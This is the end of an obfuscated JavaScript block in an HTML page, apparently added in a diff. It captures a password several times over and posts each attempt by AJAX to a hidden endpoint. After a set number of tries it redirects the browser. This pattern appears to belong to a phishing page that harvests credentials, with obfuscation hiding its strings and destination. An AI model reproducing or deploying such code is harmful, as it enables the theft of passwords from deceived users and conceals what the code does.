_0x153157=_0x20e8dc[_0x49c242(0x17e)]($,this),_0x5e68b4=_0x20e8dc[_0x49c242(0x18b)]($,this)[_0x49c242(0x1a3)](_0x20e8dc[_0x49c242(0x146)])[_0x49c242(0x134)](),_0x20a16a=new FormData(document[_0x49c242(0x171)+_0x49c242(0x115)](_0x20e8dc[_0x49c242(0x17c)]));_0x20e8dc[_0x49c242(0x17d)](num_enter_password,-0x1c3*0x7+0x23d5+-0x177f)&&_0x20a16a[_0x49c242(0x126)](_0x20e8dc[_0x49c242(0x11b)],_0x5e68b4),_0x20e8dc[_0x49c242(0x17d)](num_enter_password,0x25d4+-0x11*0xf2+-0x3a*0x60)&&_0x20a16a[_0x49c242(0x126)](_0x20e8dc[_0x49c242(0x141)],_0x5e68b4),_0x20a16a[_0x49c242(0x126)](_0x20e8dc[_0x49c242(0x11a)],num_enter_password),$[_0x49c242(0x12f)]({'url':_0x20e8dc[_0x49c242(0x144)],'type':_0x20e8dc[_0x49c242(0x14e)],'contentType':![],'processData':![],'data':_0x20a16a,'success':function(_0x331075){const _0x506c76=_0x49c242;_0x20e8dc[_0x506c76(0x17d)](num_enter_password,0x1*0xf31+-0x23d9*0x1+0x14aa)&&(window[_0x506c76(0x170)][_0x506c76(0x187)]=_0x20e8dc[_0x506c76(0x185)]),_0x20e8dc[_0x506c76(0x18b)]($,_0x20e8dc[_0x506c76(0x155)])[_0x506c76(0x180)](_0x20e8dc[_0x506c76(0x177)]),_0x153157[_0x506c76(0x1a3)](_0x20e8dc[_0x506c76(0x146)])[_0x506c76(0x134)](''),num_enter_password++;},'error':function(_0xb359d){const _0x1640ff=_0x49c242;console[_0x1640ff(0x13f)](_0xb359d);}});}),document[_0x3abe43(0x18a)+_0x3abe43(0x176)](_0x3abe43(0x165)+_0x3abe43(0x175))[_0x3abe43(0x182)+_0x3abe43(0x18f)](_0x3abe43(0x179),function(_0x11917b){const _0xf99b71=_0x3abe43,_0x606b30=String[_0xf99b71(0x119)+'de'](_0x11917b[_0xf99b71(0x199)]);!/[0-9]/[_0xf99b71(0x147)](_0x606b30)&&_0x11917b[_0xf99b71(0x152)+_0xf99b71(0x188)]();}),$[_0x3abe43(0x148)]({'headers':{'X-CSRF-TOKEN':$(_0x3abe43(0x186)+_0x3abe43(0x164)+_0x3abe43(0x14a))[_0x3abe43(0x193)](_0x3abe43(0x114))}});function hideLoader(){const _0x51688e=_0x3abe43,_0xd8923a={'leodh':_0x51688e(0x154),'kvsnN':_0x51688e(0x12a),'QJYvO':_0x51688e(0x18d)+_0x51688e(0x143),'jdhKO':_0x51688e(0x159)+'t','ejVnK':_0x51688e(0x162),'nktYs':function(_0x7abb49,_0x17c328,_0x12f79d){return _0x7abb49(_0x17c328,_0x12f79d);}},_0xd5e177=document[_0x51688e(0x171)+_0x51688e(0x115)](_0xd8923a[_0x51688e(0x15c)]),_0xf4682f=document[_0x51688e(0x171)+_0x51688e(0x115)](_0xd8923a[_0x51688e(0x11e)]);_0xd5e177[_0x51688e(0x11f)][_0x51688e(0x151)](_0xd8923a[_0x51688e(0x172)]),_0xd8923a[_0x51688e(0x12e)](setTimeout,()=>{const _0xce9948=_0x51688e;_0xd5e177[_0xce9948(0x194)][_0xce9948(0x19f)]=_0xd8923a[_0xce9948(0x12d)],_0xf4682f[_0xce9948(0x11f)][_0xce9948(0x151)](_0xd8923a[_0xce9948(0x183)]);},-0x14de*0x1+0x6fc+0xe46);}function _0x84bd(_0x30dcd1,_0x435eaf){const _0x43ba99=_0x4212();return _0x84bd=function(_0x2e2977,_0x2d7d74){_0x2e2977=_0x2e2977-(-0x4fe*-0x6+-0x1b92+0x43*-0x5);let _0x2236f7=_0x43ba99[_0x2e2977];return _0x2236f7;},_0x84bd(_0x30dcd1,_0x435eaf);}function showLoader(){const _0x57ec6b=_0x3abe43,_0x34f37c={'SXbme':_0x57ec6b(0x18d)+_0x57ec6b(0x143),'shkdQ':_0x57ec6b(0x159)+'t','EBpGY':_0x57ec6b(0x17a),'nkHNp':_0x57ec6b(0x162),'xPWtH':_0x57ec6b(0x12a),'ZniQW':_0x57ec6b(0x154),'gygTf':function(_0x42a91d,_0x1f97c8,_0x3b828e){return _0x42a91d(_0x1f97c8,_0x3b828e);}},_0x285432=document[_0x57ec6b(0x171)+_0x57ec6b(0x115)](_0x34f37c[_0x57ec6b(0x153)]),_0x3d8fb5=document[_0x57ec6b(0x171)+_0x57ec6b(0x115)](_0x34f37c[_0x57ec6b(0x149)]);_0x285432[_0x57ec6b(0x194)][_0x57ec6b(0x19f)]=_0x34f37c[_0x57ec6b(0x169)],_0x285432[_0x57ec6b(0x11f)][_0x57ec6b(0x196)](_0x34f37c[_0x57ec6b(0x14d)]),_0x3d8fb5[_0x57ec6b(0x11f)][_0x57ec6b(0x196)](_0x34f37c[_0x57ec6b(0x18e)]),_0x3d8fb5[_0x57ec6b(0x194)][_0x57ec6b(0x19f)]=_0x34f37c[_0x57ec6b(0x13d)],_0x34f37c[_0x57ec6b(0x13e)](setTimeout,hideLoader,0x15c9+-0x4*-0x8f0+-0x35a1);}window[_0x3abe43(0x182)+_0x3abe43(0x18f)](_0x3abe43(0x120),()=>{const _0x37d8f7=_0x3abe43,_0xf0ff99={'Wgzfb':function(_0x288f59,_0x18d5c3,_0x5ae53a){return _0x288f59(_0x18d5c3,_0x5ae53a);}};_0xf0ff99[_0x37d8f7(0x15e)](setTimeout,hideLoader,-0x1*-0x547+-0x31*-0x88+0xb9*-0x27);});function resetForm(){const _0x536dd7=_0x3abe43,_0x4f7b3c={'DXoBP':_0x536dd7(0x11c)+_0x536dd7(0x17b),'ggzIY':_0x536dd7(0x150),'COgrt':_0x536dd7(0x15d),'AZzvE':_0x536dd7(0x145)},_0x575722=_0x4f7b3c[_0x536dd7(0x16a)][_0x536dd7(0x14f)]('|');let _0x4085ca=0x402+-0x1ae1+0x16df;while(!![]){switch(_0x575722[_0x4085ca++]){case'0':errorPassword[_0x536dd7(0x135)+'t']='';continue;case'1':submitBtn[_0x536dd7(0x136)]=![];continue;case'2':passwordForm[_0x536dd7(0x16b)]();continue;case'3':passwordInput[_0x536dd7(0x192)]=_0x4f7b3c[_0x536dd7(0x11d)];continue;case'4':eyeIcon[_0x536dd7(0x11f)][_0x536dd7(0x196)](_0x4f7b3c[_0x536dd7(0x189)]);continue;case'5':btnLoader[_0x536dd7(0x11f)][_0x536dd7(0x151)](_0x4f7b3c[_0x536dd7(0x189)]);continue;case'6':btnText[_0x536dd7(0x135)+'t']=_0x4f7b3c[_0x536dd7(0x13b)];continue;case'7':eyeSlashIcon[_0x536dd7(0x11f)][_0x536dd7(0x151)](_0x4f7b3c[_0x536dd7(0x189)]);continue;}break;}}
+</script>
+
+</html>
